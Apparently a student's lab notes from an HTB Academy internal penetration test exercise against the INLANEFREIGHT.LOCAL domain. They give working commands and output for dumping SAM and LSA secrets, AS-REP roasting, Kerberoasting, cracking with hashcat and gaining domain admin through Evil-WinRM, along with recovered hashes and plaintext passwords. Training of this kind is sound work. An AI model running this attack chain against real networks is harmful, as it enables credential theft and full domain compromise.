
---

You are an assessor for Acme Security, Ltd. Your team has been hired to perform an internal penetration test against one of Inlanefreight's internal networks. The tester assigned to the project had to go out on leave unexpectedly, so you have been tasked by your manager with taking over the assessment. You've had limited communication with the tester, and all of their notes are left on the testing VM configured within the internal network. The scope provided by the client is as follows:

- Network range: `172.16.5.0/24`
- Domain: `INLANEFREIGHT.LOCAL`

Your teammate has already created a directory structure and detailed Obsidian notebook to record their testing activities. They made a list of `13 findings` but only recorded evidence for a few of them. Step in as the penetration tester and complete this mock engagement to the best of your abilities. Experiment with the following to refine your skills:

- Set up Tmux logging and record all of your evidence using Tmux while getting more comfortable with the tool
    
- Enumerate and exploit all 13 findings listed and gather evidence for the findings that don't have any evidence recorded in the notebook
    
- Keep a detailed log of all activities you perform
    
- Update the payload log as needed
    
- Log all scan and tool output generated while performing enumeration and gathering additional finding evidence
    
- Practice writing up the findings using either WriteHat or the provided reporting template, or practice with both.
    
- Finish the penetration test and complete the questions below to conclude this module.
    

We recommend using the provided version of the Obsidian notebook or recreating the notebook structure and directory structure locally or on the Pwnbox using Obsidian or your own preferred tool. Remember that once the lab resets, you will lose all progress and data saved on the testing VM, so make local copies of any data you would like to use to practice writing your own findings and report if you choose to complete the optional exercise included in this section.

The tasks in this section are mostly optional but highly encouraged. Completing them will give you a feel for how an internal penetration test is conducted and give you a chance to practice the extremely important skill of documentation and reporting. If you complete this entire practice lab, create a sample report, and do the same for the `Attacking Enterprise Networks` module, you will be very well prepared for the future exam associated with this path.

Good luck, and don't hesitate to contact any of the HTB Academy team via Discord with questions or feedback on your work. Have fun. You'll get out of this module and practice lab as much as you put in.

Keep hacking, and remember to think outside the box!

---

**Pull files into attack machine m8**
scp -r htb-student@10.129.5.246:~/Desktop/HTB_Academy ~/Desktop/


5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a:diamond1

ADMIN:diamond1

from FileZilla3.xml at http://172.16.5.127/files/filezilla.xml

![[Pasted image 20260123142037.png]]
librarian:nrl2@*fNs5


┌─[htb-student@par01]─[~]
└──╼ $curl http://172.16.5.127/files/index.php.bak

SNIP


            <button class="dropbtn">Language

                <i class="fa fa-caret-down"></i>

            </button>

            <div class="dropdown-content">

                <a href="index.php?language=en.php">English</a>

                <a href="index.php?language=es.php">Spanish</a>
SNIP
SNIP
                <a href="index.php?language=en.php">English</a>
                <a href="index.php?language=es.php">Spanish</a>
            </div>
        </div>
    </div>

    <div class="blog-card">
        <div class="meta">
            <div class="photo" style="background-image: url(./image.jpg)"></div>
            <ul class="details">
                <li class="author"><a href="#">William Ley</a></li>
                <li class="date">Aug. 24, 2019</li>
            </ul>
        </div>
        <div class="description">
            <h1>History</h1>
            <h2>Containers</h2>
            <?php
            include('./languages/' . $lang);
            echo $p2;
            ?>
            <p class="read-more">
                <a href="#">Read More</a>
            </p>
        </div>
    </div>
    
SNIP

</html>

The Vulnerable Parameter: language.

**The Vulnerable Sink: include('./languages/' . $lang);.**

The Exploit: Because there is no input validation or sanitization on the $lang variable, you can use directory traversal to read arbitrary files on the server.

**Evil-WinRM**
$evil-winrm -i 172.16.5.200 -u administrator -p 'Welcome123!'
C:\>reg save HKLM\SAM sam.save
C:\>reg save HKLM\SYSTEM system.save
C:\>reg save HKLM\SECURITY security.save

C:\>download sam.save
C:\>download security.save
C:\>download system.save

**NTLM hashes from DEV01**
┌─[htb-student@par01]─[~]
└──╼ $python3 /usr/local/bin/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xa3f2d1e5023c8f00dd6f7d681753d942
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/lab_adm:$DCC2$10240#lab_adm#83abcbfcaf736be6e7075096668df045
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:cab3b0bae0327c204bfc0f0a1a73b034e450340af3d5d07926715af70dde97564b4dd602730f4fde261c134e81852a0ca3dffa2a89a849203b2feac387e08bab9bbcefe57260da97f93e9b40e6d5a840aa50c6255b4b9cf0d11f5dc01980548179f7c5e1326756236998f05a9c9513ab460a2cb2586bbdb68e4f2f49bad02eeac0ca13fd5074543a103f67c909828cd693c6d49b4cce20ada7bf96ab5868af91bbbbc82ee3cc4542a8bf190349ce166e5d6fa0f0d6edfc626b486b703621eb2b9ffe798987066452e7f4c705eebcacc4fd714fff8009e101f9cd754fdb54276e1a9727d3798b5ba3e9b0af397817f17b
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c3d866e8778a1b6a9b54ef5f8aee0195
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf0a99fc5c67bc9a09fffbc85301f5c0c0c30f94c
dpapi_userkey:0xfb2f9ad47af93eeea79e266f7064d1bc75f1adcf
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] Cleaning up... 

Starting **bloodhound**
$sudo neo4j start
$bloodhound

**DHawkins** is a path to domain admin
![[Pasted image 20260123160137.png]]

1. Listing users that do not require Kerberos pre-auth

```┌─[htb-student@par01]─[/tmp]
└──╼ $GetNPUsers.py INLANEFREIGHT.LOCAL/asmith  -dc-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
Name      MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
--------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
dhawkins  CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:36:41.876149  2022-06-02 15:02:22.362146  0x410200
```

2. Requesting TGTs for users that do not require Kerberos pre-auth

```
┌─[htb-student@par01]─[/tmp]
└──╼ $GetNPUsers.py INLANEFREIGHT.LOCAL/asmith -request -dc-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
Name      MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
--------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
dhawkins  CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:36:41.876149  2022-06-02 15:02:22.362146  0x410200 



$krb5asrep$23$dhawkins@INLANEFREIGHT.LOCAL:c12d8a8a476bab7b15be2811f75ed909$1d9eaf6f457ee59c8b139a485f9d288926e604ffa4cea52a515edbdfeac0394b0c7d7445c334135002275d9b18b6977d57e76768c2981c858ba414ac8c7dd81aefd3450321ffdea2cefb42fb732ac4675929c7ca91759af077b1ce00ccadc7868e939ca0baf580f845a07446d369c29dadc579f6dfc63d21426d2c76dcb74d81c1cf71c56b396f11efb624b6b079434bafc27e17c7efd9f607224c41a5a3f2f635f67455a693744bd4ea2daf695e1630cf974689729b3432dfc7548cd25a8ab7639d4cd022acdc2371ff7c83338e9075225b8796c0ada278e57e597199ce4dc8f3ca4754bcb9ff468b6d2f9c62b4eb00c8d642124badda1b2a31
```




$GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/dhawkins:Bacon1989 -request
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
```
ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------
sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               
vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               
SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never>
```

3.Cracking hash with Hashcat

```$hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

$krb5asrep$23$dhawkins@INLANEFREIGHT.LOCAL:c12d8a8a476bab7b15be2811f75ed909$1d9eaf6f457ee59c8b139a485f9d288926e604ffa4cea52a515edbdfeac0394b0c7d7445c334135002275d9b18b6977d57e76768c2981c858ba414ac8c7dd81aefd3450321ffdea2cefb42fb732ac4675929c7ca91759af077b1ce00ccadc7868e939ca0baf580f845a07446d369c29dadc579f6dfc63d21426d2c76dcb74d81c1cf71c56b396f11efb624b6b079434bafc27e17c7efd9f607224c41a5a3f2f635f67455a693744bd4ea2daf695e1630cf974689729b3432dfc7548cd25a8ab7639d4cd022acdc2371ff7c83338e9075225b8796c0ada278e57e597199ce4dc8f3ca4754bcb9ff468b6d2f9c62b4eb00c8d642124badda1b2a31:Bacon1989
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$dhawkins@INLANEFREIGHT.LOCAL:c12d8a8a...1b2a31
Time.Started.....: Thu Jun  2 16:46:58 2022, (11 secs)
Time.Estimated...: Thu Jun  2 16:47:09 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1067.2 kH/s (1.20ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered.Total..: 1/1 (100.00%) Digests
Progress.........: 11372544/14344386 (79.28%)
Rejected.........: 0/11372544 (0.00%)
Restore.Point....: 11370496/14344386 (79.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Baddygoodlalala -> Babe1103
Hardware.Mon.#1..: Util: 73%

Started: Thu Jun  2 16:46:14 2022
Stopped: Thu Jun  2 16:47:11 2022
```

4. Using authenticated session as dhawkins to pull service tickets for the domain admins identified earlier

$GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/dhawkins:Bacon1989 -request
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

```
ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------
sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               
vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               
SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never>               



$krb5tgs$23$*solarwindsmonitor$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/solarwindsmonitor*$2b7e331ce7cc0b04be663d6395e96373$c08f985021fcef6e7aaf14a235f3f19e89c01f0dcbcd1aaff90d295ddfd0548d622276aa68851e6c8c99d9428ca32dc9b2505a35cb3f8d35d4732bbdd04759592efda9eef08a2add7da39fc411fd39208220cb98800eefbb49d776155dcf59e845cd27a5d88053ecc9fbee6834ffd05725456e7135aa7b462419e72e87c0f00eca67a6b9571bf5c4b8ce56f835ebf0fe7b4d5928d50ed0cbb2a76bf32af7070fd1b514ab025c3fcb524174caa983ae4e85e0d6dc1a71268035d5ea4eccde0f49d65d6e3e791167efd328d7a6441f4cdf1e99b41da7216e75cb1a766d40d40b2007f2468ec027aeae9fc2bc8969be92390cc177110232fc72d8c024389cc15c02f58248a5f4a58e8be58b5b1c00b43b2301e40444332b8847198c9fe05e70c29964741ba75431261e843212e921e3602e6f1b4d191c8c136ae0ba1eedab0c17f4727780a6edb32667ef70fe8d1a702d2bf42e27a1790e54193d4591388129623b646cd983e09a0752747f31d7b3dea85398034192d62a1a38eb43e04ccec79166aa1ac0482619a0fd9e335a4286b53f8fbe5819f6e5d9e9ae9cdabe883f0bdb57f85294fb70086bdfe9683b9420ac710f0b958132fbae24d2db81399554ce96807f40ff9f24c3bd27c9dc8bc4601e5f621393c250a4238baff4e7d9a34aa7fb5907fe192c4d7b5225861ac7f513e02f9885efffadfb7a8bbe53f54dd294b743afe10bc7b0512b278a405658bd2eb0d66d6b46a7aaecdc7f3d5f31bfdcb84e162fc14f927d67459d7b622c209643a61182c73154edc83fc15f2bf42acf9dffeae4c5db5eaea34d95723eb0d49f2f095066a1afa69049a1b5c4f8be22280cae9d718320299a564d45768b0b317d8dac958a8e6ea4bdf99ccdbe636c4068a2ab4a90f820e1336f091fda8605ac827efcfeaa80e9cf601dd98c4ee2337c20b0ea15a0979b1ac227bbebd2662bd5a95e7241e3783b3d8f5d6d1419b80844e07be0823e1c9839747056e299ac175ca05a4f44c3a4c6e24498d749e5af76c6d89933e7f68613dab5acfce01bbb015e394bb001720f61b64d7ae4407bb640aa9a0255ed22741913941e74348d0e67b43b38d455805b9a65ac23cc43be1d926e5668bfd2c6dec2c5883ab0b0109399d2bf812fb6b3b35169ff38f399831df9972eb90a87a5dcf95b49861480e44c6e2b9d2b4ace39e5ac1eb91e347f2408886fcb143447aabf815e9fb88d3da926db5f3c29ee52d1a2b27249163fa0018593baa1e525c9da3aacf47b28cf564535d19cd1b5af33b41d06da6164c7f9df9ef5a3453c9ddf063a9100fd134286f3fecb501f2c7a936e9d119ffe8a6cf58a02b896b457cda692ea4a233a497b03d18a54db80c5a7d3d3792e9e8eff00a45f30dfe77051c5a20a78ad38a9cc616b7c45890239fc3419712a201c0519b4c429daec385680a0c7c4f388454279b6fb8c37314e04
$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqlprod*$a0e5cbc1b2ccdbd33b04f445fb2e9640$cb6c80de709d42540d0d6d5eb471ce68de2f2004188ba0c1c24cd83c1cb62fb75642a3522439473ef59967e30f8cd696280f31f1956396acf842262e3e8de45aec3ff8a3447a7786f6e891289de5be7eab892f7024ac0c15412cdb5ecaacca876fcaf4c8d58ae21ca875d7c6925f0be33fda5376b31b01d274b0a5d5ac676bc49a97fee09095ebfda47135ea7f202565acfc201ef572d0236ef027e1652aa5f1f3d39ae1047525bd76456871ac11e8e0a496e04fc935d30ca9aeb2e666c100465f377e82e6053ce028242d6d0ca37fde9934164392160db15bfde8487db56ca012c8bf91e2d5e099d5aad90a97f3a079a07289458f3138f4e420df362efdbc5438eb410b34699dfb722eab29506cccef7ad974c1d33102ad2379c41d19f92f97e0abb7589d43d01167b058a972a996f9a304a54c220d78202169aa7c7669175716bcc0351034b24285cdb32c87e9c2676b7b9309ed33ee374f48208197d692abb575334c3e8473f615f6a1c94a92beab50d52c9206d15756f6faa954562e8bd263c3907825ba5cbb8dcb21ef7701092c6e2e057d46c0de6f85fc94f60b73fe422568b1a6f26e572aa4d8b78c2fc9c224826d903b3e36aece4d78ccccacca18879b33b627fbdd18161a5a2dc04b5b4b7aef0d3cc8a6a82a0d4d540dca658a122bcc77d511868ee7e80fc313153ff0d134ceb58b469708d1236491ebb1f7b731b008559e619da529f3518fcd2239782a269b2ef0c1a352ecdae05a16fbf4129ea377dcf0c2557ab02f515472ffdc7c9141775d1544960ccf8ee98324c10351722702889c882e88da4d455eaebba11fbc943c9530c7fec06e41525dbaf39a337738609e1d3204d2881d4f1fc9119cf793a1b0adb6faf311aabb6aa97986bf475c26c2895b3b83b71af624f377d26fb111164f962187e68277e1747e9d4132c1b1c091f7aa1c7f3fd1fceec35ec4a7b7adaa55c34c8030984115fe195f7bdf94b1eb239bdd88475ace38c2ca377ac4d818381c70ab12c5f86217212ba0c67557886f279d91a7e0558ef601e250f3774ebfebbd4091dc8397ef8b2c083c0ecd23c66497cc4a8555ca56b1a9135739dfe84c6d8e7b1079dafc78dfd4785585b04012c573f25b5bb1a1d21b7ba0c2ea249b077f13e1ce4aec6ecfe5b794a676cbea8dbb57171c74cacd7256a201aef04663b7d97ae31a39baf233cfcc3e9eb45d5af2881dc24e4a9e7eec15b558deceeae44e53d1517ccef3adad22d780bc760f98b3bab25a04d04383b2559e7d74a3062660ee46b8c90a28065d446323ec22c0a7e2a84803b604669c37215720d1ca95311c74d9302a7ac1a769aa1f2cd25fd42b88ec38cba6a9f94c5ef94bb0d4823f6c15261affe25c0adbf4f6312c3488e24a6bfae7f04c0378d484663e5ee68409518ec0c21d74a6bf93b5215cf2c4554b4a4e948eada94a3c9f80a467d72fe5
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$c730e6b55ccc70ee560add32a755e236$a386999c036df9424a9b631a2545dc76eefe073161857028bba22ed36aee7b8d7a64880edcd143be82eac9a9e47ae93fa9018b9b478ab51aa2bd557089f1dbe515478aece0107c7a3bf9d55882127dd183138f3f7e55db1e005c439dbeb4246e6fd4cc35c132c722db2e1f60c2955928da906d821f9b2629e9c1ada948dd775f14cb42a8c440498da84b6acb300f0fb415311a9c1c6bc1e31d08f5498b8aea981a95f7c37273ac7e8e7c54b91f03ffef264ab4aa21901ab58d6b89092697a1a9a1b0c500cd6c94c0a73e127c72277371e0122c35647ede6571349fd1dd769933e7cf7faee1c37fd414f2e39fe6fc47b5d33123124989e8acb4ddf3cc2b9918c8f8668de1cf1e05b68a496af4bfdb9b56057a09f8ee9d2cab0b54b410da982a68ca9ba5c1871520a709b15801665dfe25255adc6006d4506f570ee32b3999b0356dd6091040d0448a7c6fb907c04dfc11ffa172df1fc301284c638ece54c932af99a083c8d1b7d0a4d3467bbc5cba21b57d0c96ea1b65ff8b299caa9ac33819e50aed7bbb0957469b101aaf5f17abdd155e274bab14951d3b1c7994b7ca441f811469d6185919069bfa93f47aa887842bf348dd22b400e9c909c92c8eb40d9c6a0bd3028717dfb2dded72108e6ce2848c9a4b7ecf0dce6e3d36488ac5109b040722970f328248c89c964038cfd3edfd28b5d97bafb65c6478663683940617667261e99fcd33f423b728dd914c41d08704f062e683741cff63944b3317890efabbdb2d678a8bdfa54b82f8a10c2ee6694d42010309212f783f3a31a34755bf0166b49f881cb48394d81148cbd12a0da4f4b84544d4229883da55bec82ae945f3d2f9d3858f69c18760ae6f888db7000bbc353b19eba83938f8da9cd83db8a65f96ef4bb5c717812adb237d755482e431946b122773afd234afcd4ee1d4d1b05f8ae2fb288a26ec146641224fe933058fb3e801441839838b176e0a53736f6caf54d7e051c54986e1f6c2670a00ee8480ff4c884fd60828af70eb69b39b27d096867964defa07de72c3868c42855b6ff066856405846cedfbb7c2fce3918c4eda93aaf143a1d1c94d9a22e876dc61418f3c6bbc7c93c6c7f6bca5f5eaa091f073f24eb75ea444db126a57da5a42568e61c69256fa894a32534c0dc01800f4ef55257f19fa0ed090c38bf93626e6a4dd7157a7b4b1478ec01f5a2e2a2198baddde5ac74d30b31bd242b8397b56cee7cdd8b5115c2b9b30089844018eb8a252b1e2dba7d0f366184a3a0d893611df1bd3aed34e50381a0e3a320be5df26c81b23c5f8dfc08b4dfdc964ec1140b9eb94edafb674b496c8db4e01ec28793c33a4b937a78821906be69909021637fb1ab03e0553172e9c98b347fc463d84634bb90589b505f8dbe0b13b991c57ad57d72355861424ca99ed70a93788f449700dd972123c2a8ecb2f7e9e91bfb8fb1854
$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/svc_vmwaresso*$3f86dca818dae501a885cb1668e57f7f$46c718c2c0522be07cce8b1f4a2f774e9ff00d03dde0f39377ae385aeede91ad051644df6b147e78c0610a028377df8cbe7ef3ad22ea6c8b4e955a3e138ce43d7578b72ea0ebc8b10f80a1b598bb5cc13ea3ff43b479e7ee4ec7d9c051637b41f562c3f782a5f57ea590c0711c01a6a7f61ed37fcb1a584d2fb2057109743523024886f983b1feaa1d82e7ff5c4ed9e15242dde2698575ae9d221efae85d71f185940258aed2eef57ce51e3a5418afc033099a619318a3af03341407b3ca920d8d06193c3671c3c46694230da3be934ce0bef488f027660822e92ccadc9c7781fa1026990fcc5e0cccee058fd7f42380ce93d3eaf98befcc3fc6f3407057b6f2c53ecc552fdd7f5899064723950150febac669f6e1cb6cb611c70b68d85dc53453c26634f01dd18bdd82c35ae5a51ba6e9e44c5e767108a4a6c17e8d4bf932c5a7c089c962d13c76a98df1c5fe5b4f0bd5a422287e323f0518ac89b2887ea53389e71dbfd0c81c664a5ce1385df1941903ba5109a02117daf3fc78c60144ebd0c5025fe9445c76b076b8095f14319206a2ea4fe5436757a1592ed07b0935bc3f2941b70df6abbe013f52aaa698e34ba7fcceb2ecfbc9c304b9555b611f40589cc8d2154c50890afad87cdb4f8cde1e9f70baa8d37fce3b0ea464ecaa7d48f421c5cbe4b366071693c03eef0e001236f8b5b8cbd453133818a8f43af60cbb9563cc48fb9cdf21b1b73139a9b320e8af7130cbc2eb9a32c0d177aea31c8cd35a08cb6575d6d7e3ccd29a2111f02bd86634f13ed5144ea93a5c4d62a92d30e5e1274213e7898a343b3a1e053ae1cb1f45cf7b2f2f15086c3c639c5774ec91550570f88e42032c30792710968bbae3959f229dc496c95b68c3fd56cc2ea1ba7a4a52eec98fb2697515bc0bd69bcf116e149bd83b351af80b4f6c780fda2c7125d72c2a91ebd2eef64ac611c066be8da9d6a13fc6db989a63717a367bd9195e47291750b3854e8ca7a830753c2585728e0d6690b9f66e7ab635aaab5b5446710ef89b635e261e636a119aea221bfd72ea6749c276423e7ceb7d5413fba95d8623e2f3e54f1cee00bfc08f09f6c834db8949f019db5f798f9e737aa00d3852a62ff8853e31c0c91d3bcca2dcb30b12c245ccb1908fae7e60eb18562db829095d5f375e15c00901f30aac436743e2242baf7b34d1a64852e883daebe897d59b92a7b17cce57a58bfc16901dea0d4539c9e95d32c41e9061baa6d96d288d0de4854e7990bed425368396184637997629e49caa039bcb33276e1de00d9d654378ebbbceed3808968e69016a16cad1017c97fadc242357eedfe9645d178351cb7a405c476471c377fb0cb27e094a8481bb85dbf5807cdec226ae0999b0e3222d447e3e47ec3414b9629f6d7d49bd3867490af0fee81273f65523a3dbcad0860e00c073031d2c39543a90ae73aee0743b4e
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$18aacffcd8fe3204c5c8df1f3bc1ad4b$63d6ffa613ea3141487029faa87048e3ba3be120a6f8d1e72e4ebb1eb71cb253c8f1f584d0ac3e837aef309e21a96b63a19a475a4dee8cdebc1a4f34ebe9f6656c3ea870d9040ba98e217493b75f062e78b41bb00b15e7293a93dc8f53ab092ce1ccb129ca69ca14eeb6fc5524aa09ab62bfc5640cbb7cf82d53eaa4f55c61ffb1a20a4c46645c04880c3769c1bf014a5fc3c4f9be47e5dab67775f1870bce1092b666bd74baac1cd63199ee17e37d9428a3a17d60498fb9af6eced7dce7a5c2c93e0da3e256fcd01fa75c21c884a03acc8ae4f11d621e52b5c9ff8102adcd7068075e8f3dec860bfeca0f6193954d2d697a95f3b942987fc2d66a338341f046336358f51f62d1e65b48ac6acd0caaf90733f2309a5a3651ad147496af6bc2bb37c12839b95f666eb0053349e5765e5c284553df880eb7ac41acce2f27e8adcb0e8e282cb0ff52c4c9a511bf58deba19392d9d1d21f4ae23e836e3b4c813244b68f3609c98c6c1ff59578a83ac63cb9f6f5f1b7375589e17f1b5d95feaa14853ff969aef42e01a4c13f6b03ec0b683eeb9fe73e6362f52eed1b4b0a59ae5d6a6946b9ca91ff2dc7e03e2def6c9e3018b37d4e868a1cf689e9349d775cfd9046d546a27b8b6c5876e4843f1439338dd309035f48287ab4d1d9b6e020b0f5868402b8a5b5e8dc5cd4d23a1760de5a4eecd3fdad611844a431f90b89c5dc1fdd35d76d81bdd6f38ec9fc899001dc8406f708c9c9e1cb5112da9c07f947b576933725cf5b5c70866732fa91f02977722543f48f352ff26ed5c69bd0ccc1ef1c2aeec5f15ee35ed2bb81b6dba15fe6e1f4d1b50dfde27d1c178ddda967d5c2a9e14dd4697741a4d7426aeabba2c2d44368f8e364af76011471d6fd673911029a76d7ecbdaeb87c86e0e80e7c15f0bf5a40bde4024c1e0c2ddff1956b4ea1c144ad25302705b0db93d9652764d7982df454d9c338ff4389c48b148989117a8eef0fe786e55d78c556b69935c024b4b9349df17a1d78960f6774c59f326031e84c4d83209ff8733402c42f5b1edd3cfd2173595e51c7eb61dbd16f8414d7139e9e3cc6bf50c40046a788677e9127732e2f9dbc214180c32c384ee0a8be9cfa91e131805d936b03849322768b9141e0d9087a21a79784ed3699c3d9d177512e3fb62f5f1bafd09fc763f8f365d383acd5989ab7c83804bd863cea4acf0dd6216d2807b5c3f89c92a39649a911c8373e00e17164df79c6aabc402ca0dc0021c19898084d88269ee1f0d925b3054263b4caf6a1531354d75a35115ae3e930d0826061f3cad007382cb5349ba0e755a4fbea5cbb27dc66cad11260e37096a1847abccb69d3162b65de4702050a8e34c66cbdc557f753c9fb5431c85468ca1d3c445353f7efcfb51849f7425e522f6d01e30234ef9314a23b230c20707f30e99f482c986dd19504d086d33041b37fa90e55f 
```

**Cracking password**
$ hashcat -m 13100 hashes.txt rockyou.txt 
solarwindsmonitor:Solar1010

Confirming access

$crackmapexec smb 172.16.5.5 -u solarwindsmonitor -p 'Solar1010'
SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\solarwindsmonitor:Solar1010 (Pwn3d!)


$evil-winrm -i 172.16.5.5 -u solarwindsmonitor -p 'Solar1010'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\solarwindsmonitor\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\solarwindsmonitor\Documents> whoami
inlanefreight\solarwindsmonitor
